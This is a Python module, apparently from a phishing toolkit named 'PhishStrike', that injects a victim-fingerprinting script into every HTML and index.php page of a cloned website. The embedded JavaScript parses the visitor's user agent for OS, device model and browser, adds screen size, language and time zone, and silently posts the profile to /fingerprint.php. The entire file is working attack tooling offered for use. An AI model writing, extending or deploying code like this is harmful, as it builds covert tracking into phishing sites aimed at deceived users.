import os
import re

# Fingerprinting JavaScript
FINGERPRINT_JS = """
<script>
    // PhishStrike Advanced Fingerprinting
    (function() {
        var ua = navigator.userAgent;
        var osName = "Unknown OS";
        var deviceModel = "";

        // Android
        var androidMatch = ua.match(/Android\s([0-9\.]+)[;]*\s*([^;\\)]+)?/);
        if (androidMatch) {
            osName = "Android " + androidMatch[1];
            if (androidMatch[2] && androidMatch[2].indexOf("Build") === -1 && androidMatch[2].indexOf("Mobile") === -1) {
                deviceModel = androidMatch[2].trim();
            } else if (ua.indexOf("Build/") !== -1) {
                var buildMatch = ua.match(/;\s([^;]+)\sBuild\//);
                if (buildMatch) deviceModel = buildMatch[1].trim();
            }
        } 
        // iOS
        else if (ua.indexOf("iPhone") !== -1) {
            var iosMatch = ua.match(/OS\s([0-9_]+)/);
            osName = "iOS " + (iosMatch ? iosMatch[1].replace(/_/g, '.') : "");
            deviceModel = "iPhone";
        } else if (ua.indexOf("iPad") !== -1) {
            var iosMatch = ua.match(/OS\s([0-9_]+)/);
            osName = "iOS " + (iosMatch ? iosMatch[1].replace(/_/g, '.') : "");
            deviceModel = "iPad";
        } 
        // macOS
        else if (ua.indexOf("Mac OS X") !== -1) {
            var macMatch = ua.match(/Mac OS X\s([0-9_]+)/);
            osName = "macOS " + (macMatch ? macMatch[1].replace(/_/g, '.') : "");
            deviceModel = "Apple Mac";
        } 
        // Windows
        else if (ua.indexOf("Windows NT") !== -1) {
            if (ua.indexOf("Windows NT 10.0") !== -1) osName = "Windows 10/11";
            else if (ua.indexOf("Windows NT 6.3") !== -1) osName = "Windows 8.1";
            else if (ua.indexOf("Windows NT 6.2") !== -1) osName = "Windows 8";
            else if (ua.indexOf("Windows NT 6.1") !== -1) osName = "Windows 7";
            else osName = "Windows";
            deviceModel = "PC";
        } 
        // Linux
        else if (ua.indexOf("Linux") !== -1) {
            osName = "Linux";
            deviceModel = "PC";
        } else {
            osName = navigator.platform;
        }

        var fullOs = osName;
        if (deviceModel) fullOs += " (" + deviceModel + ")";

        // Browser
        var browserName = "Unknown";
        if (ua.indexOf("Firefox") !== -1) {
            browserName = "Firefox";
        } else if (ua.indexOf("SamsungBrowser") !== -1) {
            browserName = "Samsung Internet";
        } else if (ua.indexOf("Opera") !== -1 || ua.indexOf("OPR") !== -1) {
            browserName = "Opera";
        } else if (ua.indexOf("Edg") !== -1) {
            browserName = "Edge";
        } else if (ua.indexOf("Chrome") !== -1) {
            browserName = "Chrome";
        } else if (ua.indexOf("Safari") !== -1) {
            browserName = "Safari";
        }

        var data = {
            os: fullOs,
            browser: browserName,
            screen_width: window.screen.width,
            screen_height: window.screen.height,
            language: navigator.language,
            time_zone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/fingerprint.php", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify(data));
    })();
</script>
"""


def inject_features(www_dir):
    """
    Injects advanced data collection into the copied site.
    """
    for root, dirs, files in os.walk(www_dir):
        for file in files:
            file_path = os.path.join(root, file)

            # Inject fingerprinting JS into all HTML and index.php files
            if file.endswith(".html") or file == "index.php":
                try:
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()

                    if "<head>" in content:
                        content = content.replace("<head>", "<head>\n" + FINGERPRINT_JS)
                        with open(file_path, "w", encoding="utf-8") as f:
                            f.write(content)
                except (OSError, IOError):
                    pass
